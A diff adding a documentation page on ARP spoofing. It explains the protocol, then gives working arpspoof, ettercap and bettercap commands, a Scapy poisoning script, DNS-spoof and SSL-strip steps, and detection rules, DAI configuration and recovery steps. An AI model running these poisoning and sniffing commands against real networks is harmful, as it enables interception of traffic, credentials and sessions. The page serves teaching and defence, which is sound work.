@@ -1,0 +1,664 @@
+---
+title: ARP Attacks
+description: ARP spoofing, poisoning, and man-in-the-middle attacks
+---
+
+## ARP Protocol Overview
+
+**ARP (Address Resolution Protocol)** maps IP addresses to MAC addresses on local networks. It operates at Layer 2 (Data Link) and is essential for Ethernet communication.
+
+### How ARP Works
+
+```
+Host A (192.168.1.10) wants to send to Host B (192.168.1.20)
+1. Host A checks ARP cache for 192.168.1.20
+2. If not found, broadcast ARP Request: "Who has 192.168.1.20?"
+3. Host B responds with ARP Reply: "192.168.1.20 is at MAC AA:BB:CC:DD:EE:FF"
+4. Host A caches the mapping and sends frame to Host B's MAC
+```
+
+### ARP Message Types
+
+**ARP Request** (Broadcast)
+```
+Sender IP: 192.168.1.10
+Sender MAC: 00:11:22:33:44:55
+Target IP: 192.168.1.20
+Target MAC: 00:00:00:00:00:00 (unknown)
+```
+
+**ARP Reply** (Unicast)
+```
+Sender IP: 192.168.1.20
+Sender MAC: AA:BB:CC:DD:EE:FF
+Target IP: 192.168.1.10
+Target MAC: 00:11:22:33:44:55
+```
+
+### ARP Cache
+
+View ARP cache:
+```bash
+# Linux
+arp -a
+ip neigh show
+
+# Windows
+arp -a
+
+# macOS
+arp -a
+```
+
+Example output:
+```
+? (192.168.1.1) at 00:11:22:33:44:55 [ether] on eth0
+? (192.168.1.20) at AA:BB:CC:DD:EE:FF [ether] on eth0
+```
+
+## ARP Vulnerabilities
+
+### No Authentication
+- ARP has no security mechanism
+- Any host can send ARP replies
+- Unsolicited ARP replies are accepted
+- Cache entries can be overwritten
+
+### Broadcast Nature
+- ARP requests are broadcast to all hosts
+- Any host can respond
+- Multiple responses possible
+
+### Stateless Protocol
+- No session tracking
+- No verification of responses
+- Cache entries expire, can be re-poisoned
+
+## ARP Spoofing/Poisoning
+
+**ARP spoofing** (also called ARP poisoning) involves sending fake ARP messages to associate the attacker's MAC address with another host's IP address, typically the gateway.
+
+### Attack Scenario
+
+```
+Normal:
+Client (192.168.1.10) → Gateway (192.168.1.1, MAC: AA:AA:AA:AA:AA:AA)
+
+Attack:
+Attacker sends fake ARP reply to Client:
+"192.168.1.1 is at BB:BB:BB:BB:BB:BB" (Attacker's MAC)
+
+Client updates ARP cache:
+192.168.1.1 → BB:BB:BB:BB:BB:BB (Attacker)
+
+All traffic to gateway goes through attacker (MITM)
+```
+
+### Bidirectional Poisoning
+
+To intercept traffic in both directions:
+```
+1. Poison Client: "Gateway IP is at Attacker MAC"
+2. Poison Gateway: "Client IP is at Attacker MAC"
+3. Enable IP forwarding on attacker machine
+4. All traffic flows through attacker
+```
+
+## ARP Attack Tools
+
+### arpspoof
+
+Part of dsniff suite, simple and effective.
+
+#### Installation
+```bash
+# Debian/Ubuntu
+sudo apt install dsniff
+
+# macOS
+brew install dsniff
+```
+
+#### Basic Usage
+```bash
+# Poison victim's ARP cache
+sudo arpspoof -i eth0 -t <victim-ip> <gateway-ip>
+
+# Example: Tell 192.168.1.10 that gateway (192.168.1.1) is at attacker's MAC
+sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
+
+# Bidirectional (run in two terminals)
+# Terminal 1: Poison victim
+sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
+
+# Terminal 2: Poison gateway
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
+
+# Enable IP forwarding (Linux)
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+# OR
+sudo sysctl -w net.ipv4.ip_forward=1
+```
+
+### Ettercap
+
+Full-featured MITM framework with plugin support.
+
+#### Installation
+```bash
+# Debian/Ubuntu
+sudo apt install ettercap-graphical ettercap-text-only
+
+# macOS
+brew install ettercap
+```
+
+#### GUI Mode
+```bash
+sudo ettercap -G
+
+# Steps:
+# 1. Sniff → Unified sniffing → Select interface
+# 2. Hosts → Scan for hosts
+# 3. Hosts → Hosts list
+# 4. Add gateway to Target 1
+# 5. Add victim to Target 2
+# 6. MITM → ARP poisoning → Sniff remote connections
+# 7. Start → Start sniffing
+```
+
+#### CLI Mode
+```bash
+# Text interface
+sudo ettercap -T -M arp:remote -i eth0 /victim-ip// /gateway-ip//
+
+# Example
+sudo ettercap -T -M arp:remote -i eth0 /192.168.1.10// /192.168.1.1//
+
+# Against entire subnet
+sudo ettercap -T -M arp:remote -i eth0 /192.168.1.0/24// /192.168.1.1//
+
+# With filter (SSL stripping, etc.)
+sudo ettercap -T -M arp:remote -F filter.ef -i eth0 //
+
+# Quiet mode (log only)
+sudo ettercap -T -M arp:remote -i eth0 -q /victim// /gateway//
+```
+
+#### Ettercap Filters
+```bash
+# Create filter file (example: dns-spoof.ecf)
+if (ip.proto == UDP && udp.dst == 53) {
+    if (search(DATA.data, "example.com")) {
+        replace("example.com", "attacker.com");
+        msg("DNS spoofed\n");
+    }
+}
+
+# Compile filter
+etterfilter dns-spoof.ecf -o dns-spoof.ef
+
+# Use filter
+sudo ettercap -T -M arp:remote -F dns-spoof.ef -i eth0 //
+```
+
+### Bettercap
+
+Modern, powerful MITM framework with scripting.
+
+#### Installation
+```bash
+# Debian/Ubuntu
+sudo apt install bettercap
+
+# macOS
+brew install bettercap
+
+# From source
+go install github.com/bettercap/bettercap@latest
+```
+
+#### Interactive Mode
+```bash
+sudo bettercap -iface eth0
+
+# Commands in interactive shell:
+# Discover hosts
+> net.probe on
+
+# Show hosts
+> net.show
+
+# Set targets
+> set arp.spoof.targets 192.168.1.10
+> set arp.spoof.fullduplex true
+
+# Start ARP spoofing
+> arp.spoof on
+
+# Sniff credentials
+> net.sniff on
+
+# HTTP/HTTPS traffic
+> set http.proxy.sslstrip true
+> http.proxy on
+> https.proxy on
+```
+
+#### Scripting (Caplets)
+```bash
+# Create caplet file (mitm.cap)
+net.probe on
+set arp.spoof.targets 192.168.1.10
+set arp.spoof.fullduplex true
+arp.spoof on
+net.sniff on
+
+# Run caplet
+sudo bettercap -iface eth0 -caplet mitm.cap
+```
+
+### Cain & Abel (Windows)
+
+Legacy tool for Windows, still effective.
+
+```
+1. Configure sniffer (adapter)
+2. Start sniffer
+3. Click "+" to scan for hosts
+4. Go to "APR" tab (ARP Poison Routing)
+5. Click "+" and select targets
+6. Click "Start/Stop APR" button
+```
+
+## Attack Techniques
+
+### Gratuitous ARP Attack
+
+Send unsolicited ARP replies to poison caches.
+
+```bash
+# Using arping
+sudo arping -U -I eth0 -s 192.168.1.1 192.168.1.10
+# Sends gratuitous ARP claiming to be gateway
+```
+
+### ARP Cache Poisoning via Scapy
+
+```python
+#!/usr/bin/env python3
+from scapy.all import *
+import time
+
+victim_ip = "192.168.1.10"
+victim_mac = "00:11:22:33:44:55"
+gateway_ip = "192.168.1.1"
+gateway_mac = "AA:AA:AA:AA:AA:AA"
+attacker_mac = "BB:BB:BB:BB:BB:BB"
+
+def poison(target_ip, target_mac, spoof_ip):
+    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
+    send(arp, verbose=False)
+
+try:
+    while True:
+        poison(victim_ip, victim_mac, gateway_ip)
+        poison(gateway_ip, gateway_mac, victim_ip)
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\nRestoring ARP tables...")
+    # Send correct ARP to restore
+    restore = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac)
+    send(restore, count=5, verbose=False)
+```
+
+### Man-in-the-Middle Attack Flow
+
+```
+1. Enable IP forwarding
+2. Start ARP poisoning (victim and gateway)
+3. Capture traffic with tcpdump/Wireshark
+4. Optionally manipulate traffic
+5. Log credentials, session tokens, etc.
+```
+
+Complete Example:
+```bash
+# Terminal 1: Enable forwarding
+sudo sysctl -w net.ipv4.ip_forward=1
+
+# Terminal 2: ARP poison victim
+sudo arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1
+
+# Terminal 3: Capture traffic
+sudo tcpdump -i eth0 -w mitm.pcap -s 0
+
+# Or use Wireshark GUI
+sudo wireshark -i eth0 -k
+```
+
+## Detection Methods
+
+### Network-Based Detection
+
+#### Detect with arpwatch
+
+```bash
+# Install
+sudo apt install arpwatch
+
+# Start monitoring
+sudo arpwatch -i eth0
+
+# Check logs
+sudo tail -f /var/log/syslog | grep arpwatch
+
+# Example alert:
+# changed ethernet address 192.168.1.1 from 0:11:22:33:44:55 to bb:bb:bb:bb:bb:bb
+```
+
+#### Detect with arpalert
+
+```bash
+# Install
+sudo apt install arpalert
+
+# Configuration (/etc/arpalert/arpalert.conf)
+interface = eth0
+maclist file = /etc/arpalert/maclist.allow
+
+# Add legitimate MACs to whitelist
+echo "192.168.1.1 00:11:22:33:44:55" | sudo tee -a /etc/arpalert/maclist.allow
+
+# Start
+sudo arpalert
+```
+
+#### Monitor with tcpdump
+
+```bash
+# Capture ARP traffic
+sudo tcpdump -i eth0 arp -e -n
+
+# Look for:
+# - Duplicate IPs with different MACs
+# - Excessive ARP replies
+# - Unsolicited ARP replies
+```
+
+#### Wireshark Detection
+
+```
+# Display filter
+arp
+
+# Look for:
+# - ARP replies without requests
+# - Same IP with different MACs
+# - High rate of ARP packets
+
+# Filter duplicate IPs
+arp.duplicate-address-detected
+
+# Filter gratuitous ARP
+arp.opcode == 2 && arp.src.proto_ipv4 == arp.dst.proto_ipv4
+```
+
+### Host-Based Detection
+
+#### Manual ARP Cache Inspection
+
+```bash
+# Linux
+arp -a
+ip neigh show
+
+# Look for duplicate IPs or unexpected MACs
+# Compare with known good values
+```
+
+#### Static ARP Entries
+
+```bash
+# Add static entry (prevents poisoning)
+# Linux
+sudo arp -s 192.168.1.1 00:11:22:33:44:55
+
+# Windows
+arp -s 192.168.1.1 00-11-22-33-44-55
+
+# View static entries
+arp -a | grep CM  # Linux (CM = complete, permanent)
+```
+
+#### Automated Detection Script
+
+```bash
+#!/bin/bash
+# arp-monitor.sh
+
+GATEWAY_IP="192.168.1.1"
+GATEWAY_MAC="00:11:22:33:44:55"
+
+while true; do
+    CURRENT_MAC=$(arp -n $GATEWAY_IP | awk '/ether/ {print $3}')
+    if [ "$CURRENT_MAC" != "$GATEWAY_MAC" ]; then
+        echo "[ALERT] ARP Poisoning detected!"
+        echo "Expected MAC: $GATEWAY_MAC"
+        echo "Current MAC: $CURRENT_MAC"
+        # Send alert email or notification
+    fi
+    sleep 5
+done
+```
+
+### IDS/IPS Detection
+
+#### Snort Rules
+
+```snort
+# Detect ARP spoofing
+alert arp any any -> any any (msg:"ARP Spoofing Detected"; \
+  arp_opcode:2; \
+  threshold:type both, track by_src, count 5, seconds 60; \
+  sid:1000020;)
+
+# Detect gratuitous ARP
+alert arp any any -> any any (msg:"Gratuitous ARP"; \
+  arp_opcode:2; \
+  content:"|00 00 00 00 00 00|"; offset:18; depth:6; \
+  sid:1000021;)
+```
+
+#### Suricata Rules
+
+```yaml
+alert arp any any -> any any (msg:"Possible ARP Spoofing"; \
+  arp.opcode:2; \
+  threshold:type threshold, track by_src, count 10, seconds 60; \
+  classtype:network-scan; sid:2000020;)
+```
+
+## Prevention and Mitigation
+
+### Dynamic ARP Inspection (DAI)
+
+DAI validates ARP packets against DHCP snooping binding database.
+
+```cisco
+# Prerequisites: DHCP snooping enabled
+ip dhcp snooping
+ip dhcp snooping vlan 10
+
+# Enable DAI
+ip arp inspection vlan 10
+
+# Trust uplink ports (to routers/servers)
+interface GigabitEthernet0/1
+  ip arp inspection trust
+
+# Rate limiting (prevent DoS)
+interface range FastEthernet0/1-24
+  ip arp inspection limit rate 15 burst interval 1
+
+# Validate source MAC
+ip arp inspection validate src-mac
+
+# Validate destination MAC
+ip arp inspection validate dst-mac
+
+# Validate IP addresses
+ip arp inspection validate ip
+
+# All validations
+ip arp inspection validate src-mac dst-mac ip
+
+# Verify configuration
+show ip arp inspection
+show ip arp inspection statistics
+```
+
+### Static ARP Entries
+
+```bash
+# Critical servers/gateways
+sudo arp -s 192.168.1.1 00:11:22:33:44:55
+sudo arp -s 192.168.1.10 AA:BB:CC:DD:EE:FF
+
+# Persist across reboots (Linux)
+echo "192.168.1.1 00:11:22:33:44:55" | sudo tee -a /etc/ethers
+```
+
+### Port Security
+
+```cisco
+interface FastEthernet0/5
+  switchport port-security
+  switchport port-security maximum 1
+  switchport port-security violation shutdown
+  switchport port-security mac-address sticky
+```
+
+### Private VLANs
+
+Isolate hosts to prevent lateral attacks.
+
+```cisco
+vlan 100
+  private-vlan primary
+vlan 101
+  private-vlan isolated
+```
+
+### Encryption
+
+Use encrypted protocols to minimize impact:
+- HTTPS instead of HTTP
+- SSH instead of Telnet
+- VPN for remote access
+- TLS for email (SMTPS, IMAPS)
+
+### Network Segmentation
+
+- Separate VLANs for departments
+- DMZ for public-facing services
+- Management VLAN for infrastructure
+- Guest network isolation
+
+## Recovery from Attack
+
+### Immediate Steps
+
+1. **Identify poisoned hosts**
+   ```bash
+   # Check for duplicate MACs
+   arp -a
+   ```
+
+2. **Clear ARP cache**
+   ```bash
+   # Linux
+   sudo ip -s -s neigh flush all
+   
+   # Windows
+   arp -d *
+   
+   # macOS
+   sudo arp -a -d
+   ```
+
+3. **Locate attacker**
+   ```cisco
+   show ip arp inspection
+   show mac address-table | include <attacker-mac>
+   ```
+
+4. **Shutdown malicious port**
+   ```cisco
+   interface FastEthernet0/12
+     shutdown
+   ```
+
+5. **Enable DAI** if not already active
+
+### Long-Term Remediation
+
+1. Enable DAI on all VLANs
+2. Implement DHCP snooping
+3. Deploy IDS/IPS with ARP detection
+4. Use static ARP for critical systems
+5. Regular security audits
+6. Network Access Control (802.1X)
+7. User security awareness training
+
+## Best Practices
+
+1. **Enable DAI** on all access switches
+2. **Implement DHCP snooping** as prerequisite
+3. **Static ARP entries** for servers and gateways
+4. **Monitor ARP traffic** with arpwatch or similar
+5. **Use encrypted protocols** to mitigate impact
+6. **Network segmentation** with VLANs
+7. **Port security** to limit MAC addresses
+8. **Regular audits** of ARP tables
+9. **IDS/IPS deployment** with ARP rules
+10. **Educate users** about MITM risks
+
+## Advanced Attack Scenarios
+
+### ARP Spoofing + DNS Spoofing
+```bash
+# Poison ARP
+sudo ettercap -T -M arp:remote //victim// //gateway//
+
+# Spoof DNS
+# Use dnsspoof or modify /etc/hosts
+echo "192.168.1.100 google.com" | sudo tee -a /etc/hosts
+
+# Or with Bettercap
+set dns.spoof.domains google.com
+set dns.spoof.address 192.168.1.100
+dns.spoof on
+```
+
+### SSL Stripping
+```bash
+# Using sslstrip (deprecated)
+sudo sslstrip -l 8080
+
+# Using Bettercap
+set http.proxy.sslstrip true
+http.proxy on
+```
+
+### Session Hijacking
+After MITM, capture session cookies and replay them.
+
+## Resources
+
+- RFC 826: Address Resolution Protocol
+- Ettercap: https://www.ettercap-project.org
+- Bettercap: https://www.bettercap.org
+- arpwatch Tool Documentation
+- Cisco DAI Configuration Guide
+- MITM Attack Mitigation Strategies
